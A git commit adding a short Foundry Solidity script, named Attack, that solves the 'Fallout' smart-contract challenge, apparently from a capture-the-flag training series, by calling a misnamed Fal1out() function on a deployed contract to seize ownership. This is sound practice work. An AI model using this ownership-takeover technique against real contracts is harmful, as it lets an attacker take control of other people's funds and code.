96dc790ee0d356a3d1347bb26229d4c64d64eaa2
Shandy Sulen <shandysulen@gmail.com>
2024-01-17 14:24:19 -0500

    complete Fallout

---
+++ script/3-Fallout.s.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+import "../levels/3-Fallout.sol";
+import "forge-std/Script.sol";
+
+contract Attack is Script {
+    Fallout fallout = Fallout(0x294D530705EcDF179fA14b27eAad1dCB634AB5Fe);
+
+    function run() external{
+        vm.startBroadcast();
+
+        // Call Fal1out function to claim ownership
+        fallout.Fal1out();
+
+        vm.stopBroadcast();
+    }
+}
